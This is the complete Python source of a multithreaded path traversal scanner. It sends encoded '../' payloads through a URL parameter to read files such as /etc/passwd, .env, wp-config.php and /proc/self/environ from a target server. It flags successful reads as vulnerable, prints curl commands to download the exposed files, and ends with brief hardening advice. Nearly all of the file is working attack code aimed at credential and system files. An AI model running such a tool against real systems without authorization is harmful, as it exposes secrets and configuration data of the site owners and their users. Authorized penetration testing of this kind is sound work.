#!/usr/bin/env python3
import argparse
import concurrent.futures
import logging
import os
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass
from typing import Dict, List, Optional, Set, Tuple

import requests
from requests.exceptions import RequestException
from rich.console import Console
from rich.logging import RichHandler
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up rich console
console = Console()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    datefmt="[%X]",
    handlers=[RichHandler(rich_tracebacks=True, console=console)]
)
logger = logging.getLogger("path_traversal_scanner")

@dataclass
class PathTraversalResult:
    """Class to store path traversal test results"""
    url: str
    status_code: int
    content_length: int
    file_path: str
    traversal_depth: int
    encoding_type: str
    response_time: float
    content_preview: str
    headers: Dict[str, str] = None  
    content: bytes = None


class PathTraversalScanner:
    """Advanced Path Traversal Scanner"""
    
    def __init__(self, args):
        self.target_url = args.url.rstrip('/')
        self.endpoint = args.endpoint.strip('/')
        self.parameter = args.parameter
        self.max_depth = args.depth
        self.timeout = args.timeout
        self.threads = args.threads
        self.output_file = args.output
        self.verbose = args.verbose
        self.proxy = args.proxy
        self.cookies = self._parse_cookies(args.cookies)
        self.user_agent = args.user_agent
        self.found_vulnerabilities = set()
        self.session = requests.Session()
        self.session.verify = not args.insecure
        self.ignore_404 = args.ignore_404
        
        # Set up HTTP headers
        self.headers = {
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
        }
        
        # Set up proxy if specified
        if self.proxy:
            self.session.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }
        
        # Set up cookies if specified
        if self.cookies:
            self.session.cookies.update(self.cookies)
    
    @staticmethod
    def _parse_cookies(cookie_string: Optional[str]) -> dict:
        """Parse cookies from a string format (name1=value1; name2=value2)"""
        if not cookie_string:
            return {}
        
        cookies = {}
        for cookie in cookie_string.split(';'):
            if '=' in cookie:
                name, value = cookie.strip().split('=', 1)
                cookies[name] = value
        return cookies
    
    def validate_target_url(self) -> bool:
        """
        Validate that the target URL is accessible before starting the scan.
        Returns True if the URL is valid and accessible, False otherwise.
        """
        try:
            if self.verbose:
                logger.info(f"Validating target URL: {self.target_url}")
                
            response = self.session.get(
                self.target_url,
                headers=self.headers,
                timeout=self.timeout,
                allow_redirects=True
            )
            
            # Check if the response is 404 or another error
            if response.status_code == 404:
                logger.error(f"[bold red]Target URL returns 404 Not Found: {self.target_url}[/bold red]")
                if not self.ignore_404:
                    logger.error("[bold yellow]Use --ignore-404 flag to scan anyway[/bold yellow]")
                    return False
                else:
                    logger.warning("[bold yellow]Proceeding with scan despite 404 (--ignore-404 flag is set)[/bold yellow]")
                    return True
            elif response.status_code >= 400:
                logger.warning(f"[bold yellow]Target URL returned status code {response.status_code}: {self.target_url}[/bold yellow]")
                if self.verbose:
                    logger.warning(f"Response preview: {response.text[:200]}")
                return True  # Still return True to continue with scan
            
            if self.verbose:
                logger.info(f"Target URL validation successful (status code: {response.status_code})")
            return True
            
        except RequestException as e:
            logger.error(f"[bold red]Could not connect to target URL: {str(e)}[/bold red]")
            return False
    
    def generate_traversal_payloads(self, file_path: str) -> List[Tuple[str, int, str]]:
        """Generate different traversal payloads for testing"""
        payloads = []
        
        
        clean_path = file_path.lstrip('/')
        
        # Test paths with and without leading slash
        paths_to_test = [file_path]
        if file_path != clean_path:
            paths_to_test.append(clean_path)
        
        for path in paths_to_test:
            for depth in range(1, self.max_depth + 1):
                # Standard 
                traversal = '../' * depth
                payloads.append((f"{traversal}{path}", depth, "standard"))
                
                # URL-encoded 
                encoded_traversal = '%2e%2e%2f' * depth
                payloads.append((f"{encoded_traversal}{path}", depth, "url-encoded"))
                
                # Double URL-encoded 
                double_encoded_traversal = '%252e%252e%252f' * depth
                payloads.append((f"{double_encoded_traversal}{path}", depth, "double-url-encoded"))
                
                # Mixed encoding 
                mixed_traversal = '..%2f' * depth
                payloads.append((f"{mixed_traversal}{path}", depth, "mixed-encoded"))
                
                # Path normalization bypass
                if depth > 1:
                    norm_traversal = '../' * (depth-1) + 'a/../' + path
                    payloads.append((f"{norm_traversal}", depth, "normalization-bypass"))
        
        return payloads
    
    def test_path_traversal(self, file_path: str, depth: int, encoding_type: str, payload: str) -> Optional[PathTraversalResult]:
        """Test a single path traversal attempt"""
        if self.endpoint:
            url = f"{self.target_url}/{self.endpoint}"
        else:
            url = self.target_url
        
        # Construct the full URL with parameters
        full_url = f"{url}?{self.parameter}={payload}"
        
        try:
            start_time = time.time()
            response = self.session.get(
                full_url,
                headers=self.headers,
                timeout=self.timeout,
                allow_redirects=False
            )
            response_time = time.time() - start_time
            
            # Only process responses with status code 200
            if response.status_code == 200:
                content_preview = response.text[:200].strip()
                
                return PathTraversalResult(
                    url=full_url,
                    status_code=response.status_code,
                    content_length=len(response.content),
                    file_path=file_path,
                    traversal_depth=depth,
                    encoding_type=encoding_type,
                    response_time=response_time,
                    content_preview=content_preview,
                    headers=dict(response.headers),  
                    content=response.content[:1024]
                )
            
            return None
        
        except RequestException as e:
            if self.verbose:
                logger.warning(f"Request failed: {str(e)}")
            return None
    
    def scan_file(self, file_path: str) -> List[PathTraversalResult]:
        """Scan a single file for path traversal vulnerability"""
        results = []
        
        # Generate payloads
        payloads = self.generate_traversal_payloads(file_path)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_payload = {
                executor.submit(self.test_path_traversal, file_path, depth, encoding_type, payload): (payload, depth, encoding_type)
                for payload, depth, encoding_type in payloads
            }
            
            for future in concurrent.futures.as_completed(future_to_payload):
                payload, depth, encoding_type = future_to_payload[future]
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                        
                        # Display vulnerability as soon as it's found with simpler formatting
                        self.found_vulnerabilities.add(result.url)
                        console.print("\n[VULNERABLE] URL: " + result.url)
                        console.print("File: " + result.file_path)
                        console.print(f"Depth: {result.traversal_depth}, Encoding: {result.encoding_type}")
                        console.print(f"Status: {result.status_code}, Length: {result.content_length}")
                        console.print(f"Content: {result.content_preview[:100]}")
                        
                        # Check if it's downloadable content
                        if self.detect_downloadable_content(result):
                            console.print(f"WARNING: Potential downloadable file detected")
                            console.print(f"Download with: curl -o output_file '{result.url}'")
                        
                        console.print("-" * 60)
                        
                except Exception as e:
                    if self.verbose:
                        logger.error(f"Error testing payload {payload}: {str(e)}")
        
        return results
    
    def scan(self, file_paths: List[str]) -> List[PathTraversalResult]:
        """Scan multiple files for path traversal vulnerabilities"""
        # First validate the target URL
        if not self.validate_target_url():
            logger.error("Target URL validation failed. Aborting scan.")
            return []
            
        all_results = []
        
        console.print("\nStarting path traversal scan")
        console.print(f"Target URL: {self.target_url}")
        console.print("Discovered vulnerabilities")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("{task.description}"),
            TimeElapsedColumn(),
            console=console
        ) as progress:
            task = progress.add_task("Scanning for path traversal vulnerabilities...", total=len(file_paths))
            
            for file_path in file_paths:
                if self.verbose:
                    logger.info(f"Testing file: {file_path}")
                
                results = self.scan_file(file_path)
                all_results.extend(results)
                
                progress.update(task, advance=1)
        
        return all_results
    
    def detect_downloadable_content(self, result: PathTraversalResult) -> bool:
        """
        Detect if the response likely contains binary or downloadable content
        that should be saved to a file rather than displayed.
        """
        # Check content preview for binary indicators
        binary_indicators = [
            b'\x00',  # Null byte, common in binary files
            b'\x1f\x8b',  # gzip magic bytes
            b'SQLite',  # SQLite database
            b'PK\x03\x04',  # ZIP file magic bytes
            b'\x50\x4b\x03\x04',  # PKZip 
            b'\x25\x50\x44\x46',  # PDF file
            b'\xff\xd8\xff',  # JPEG image
            b'\x89\x50\x4e\x47',  # PNG image
        ]
        
        
        db_extensions = ['.db', '.sqlite', '.sqlite3', '.mdb', '.accdb', '.sql', '.bak']
        
        
        if any(result.file_path.lower().endswith(ext) for ext in db_extensions):
            return True
        
        # Check for content type header 
        content_type = result.headers.get('Content-Type', '')
        if any(x in content_type.lower() for x in ['application/octet-stream', 'application/x-binary', 'application/vnd.sqlite']):
            return True
        
        
        try:
            
            content_bytes = result.content_preview.encode() if isinstance(result.content_preview, str) else result.content_preview
            if any(indicator in content_bytes for indicator in binary_indicators):
                return True
        except:
            pass
        
        
        try:
            content_bytes = result.content_preview.encode() if isinstance(result.content_preview, str) else result.content_preview
            printable_chars = sum(32 <= byte <= 126 or byte in (9, 10, 13) for byte in content_bytes)
            if printable_chars / len(content_bytes) < 0.8:  
                return True
        except:
            pass
        
        return False
    
    def save_results(self, results: List[PathTraversalResult]) -> None:
        """Save scan results to a file"""
        if not self.output_file:
            return
        
        with open(self.output_file, 'w') as f:
            f.write("Path Traversal Vulnerability Scan Results\n")
            f.write("=" * 50 + "\n\n")
            f.write(f"Target URL: {self.target_url}\n")
            f.write(f"Endpoint: {self.endpoint}\n")
            f.write(f"Parameter: {self.parameter}\n")
            f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            f.write("Vulnerable Endpoints:\n")
            f.write("-" * 50 + "\n")
            
            for result in results:
                f.write(f"URL: {result.url}\n")
                f.write(f"Status Code: {result.status_code}\n")
                f.write(f"Content Length: {result.content_length}\n")
                f.write(f"File Path: {result.file_path}\n")
                f.write(f"Traversal Depth: {result.traversal_depth}\n")
                f.write(f"Encoding Type: {result.encoding_type}\n")
                f.write(f"Response Time: {result.response_time:.2f}s\n")
                f.write(f"Content Preview: {result.content_preview}\n")
                f.write("-" * 50 + "\n")
        
        logger.info(f"Results saved to {self.output_file}")
    
    def print_summary(self, results: List[PathTraversalResult]) -> None:
        """Print a summary of the scan results"""
        console.print("\nScan Summary")
        console.print(f"Target URL: {self.target_url}")
        console.print(f"Total potential vulnerabilities found: {len(results)}")
        
        if results:
            console.print("\nVulnerable Endpoints:")
            for result in results:
                console.print(f"  - {result.url}")
                console.print(f"    Status: {result.status_code}, File: {result.file_path}")
                console.print(f"    Depth: {result.traversal_depth}, Encoding: {result.encoding_type}")
                
                if self.detect_downloadable_content(result):
                    console.print(f"    WARNING: Potential downloadable file detected")
                    console.print(f"    Download with: curl -o output_file '{result.url}'")
        else:
            console.print("\nNo vulnerabilities found with the current configuration.")
            console.print("Possible next steps:")
            console.print("  - Try different target files (use --files option)")
            console.print("  - Increase traversal depth (use -d option)")
            console.print("  - Try different parameter names if unsure")
            console.print("  - The target may not be vulnerable or may be using different paths")
        
        console.print("\nRecommendations:")
        console.print("  - Validate and sanitize all user inputs")
        console.print("  - Implement proper access controls and file permissions")
        console.print("  - Consider using a web application firewall (WAF)")
        console.print("  - Use safe file handling functions that don't allow directory traversal")


def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Advanced Path Traversal Scanner")
    
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-e", "--endpoint", default="", help="Endpoint to test (default: none)")
    parser.add_argument("-p", "--parameter", required=True, help="Query parameter name")
    parser.add_argument("-d", "--depth", type=int, default=10, help="Maximum directory traversal depth (default: 10)")
    parser.add_argument("-t", "--timeout", type=float, default=5.0, help="Request timeout in seconds (default: 5.0)")
    parser.add_argument("-o", "--output", help="Output file for results")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")
    parser.add_argument("--proxy", help="Proxy to use (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--user-agent", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", help="User-Agent header")
    parser.add_argument("--cookies", help="Cookies to include with requests (format: name1=value1; name2=value2)")
    parser.add_argument("--insecure", action="store_true", help="Disable SSL certificate verification")
    parser.add_argument("--files", help="Comma-separated list of files to test")
    parser.add_argument("--ignore-404", action="store_true", help="Continue scanning even if the target URL returns 404")
    
    args = parser.parse_args()
    


    console.print("   ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗  ")
    console.print("  ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗ ")
    console.print("  ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝ ")
    console.print("  ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗ ")
    console.print("  ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║ ")
    console.print("   ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ")
    console.print("                                                           ")
    

    default_files = [
        "/etc/passwd",
        "wp-config.php",
        ".env",
        "config.php",
        "web.config",
        "app.config",
        "/proc/self/environ",
        "/etc/hosts",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "application.properties",
        "database.properties",
        "settings.py",
        "config.yml",
        "index.php",
    ]
    
    if args.files:
        files_to_test = args.files.split(',')
    else:
        files_to_test = default_files
    

    scanner = PathTraversalScanner(args)
    

    try:
        results = scanner.scan(files_to_test)
        
      
        scanner.print_summary(results)
        if args.output:
            scanner.save_results(results)
            
    except KeyboardInterrupt:
        console.print("\n[bold red]Scan interrupted by user[/bold red]")
        sys.exit(1)
    except Exception as e:
        logger.error(f"An error occurred: {str(e)}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
